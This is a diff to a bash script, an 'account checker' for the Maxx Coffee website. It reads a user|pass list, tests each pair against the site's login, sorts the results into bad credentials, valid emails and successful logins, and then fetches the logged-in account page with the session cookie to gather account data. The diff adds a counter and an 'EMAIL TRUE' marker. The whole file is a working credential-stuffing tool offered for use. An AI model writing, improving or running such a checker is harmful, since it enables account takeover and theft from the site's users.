@@ -2,12 +2,15 @@
 # MAXXCOFFEE CHECKER
 # Schopath Asshole
 # Released: 10 Dec 2017
-# Usage: maxxcoffee.sh userlist.txt
+# Delimiter usage in listfile: user|pass
+# Usage: ./maxxcoffee.sh userlist.txt
 
 USRLIST=$1;
 echo '!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~!';
 echo '! MAXX COFFEE ACCOUNT CHECKER !';
 echo '!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~!';
+echo '';
+echo ' ['$(cat $USRLIST | wc -l)'] User/Pass list loaded.';
 echo '';
 
 for usrpass in $(cat $USRLIST); do
@@ -21,7 +24,7 @@ if [[ $(cat maxx.tmp | grep 'The user credentials were incorrect.' | wc -l) == '
 	echo '[FALSE] '$EMAIL'|'$PASS' (BAD)';
 
 elif [[ $(cat maxx.tmp | grep 'The credentials you entered' | wc -l) == '1' ]]; then
-	echo '[FALSE] '$EMAIL'|'$PASS;
+	echo '[FALSE] '$EMAIL'|'$PASS' (EMAIL TRUE)';
 
 elif [[ $(cat maxx.tmp | grep 'Redirecting to https://maxx.coffee/home' | wc -l) == '1' ]]; then
 	curl -s -L -b cookie.tmp https://maxx.coffee/home > maxx_gather.tmp
